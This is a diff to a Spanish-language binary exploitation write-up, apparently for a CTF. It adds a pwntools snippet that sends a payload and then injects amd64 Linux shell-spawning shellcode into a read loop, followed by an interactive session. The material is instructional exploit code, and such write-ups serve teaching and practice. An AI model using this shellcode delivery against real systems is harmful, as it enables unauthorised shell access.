@@ -397,6 +397,17 @@ $rsi=0x7ffff7feadbe ---> char *buf
 $rdx=0x64 ---> size_t count
 ```
 
-Lo que está haciendo es un bucle para leer por consola lo que le enviemos, lo guarda en el bufer de 0x64 en 0x64 bytes. Si nos fijamos en el python le envía una shell.
+Lo que está haciendo es un bucle para leer por consola lo que le enviemos, lo guarda en el bufer de 0x64 en 0x64 bytes. Si nos fijamos en el python después del payload le envía una shell:
+
+```python
+p.send(payload)
+sleep(0.5)
+p.sendline(asm(shellcraft.amd64.linux.sh()))
+```
+
+Elegante ¿eh?
+
+
+p.interactive()
 
 
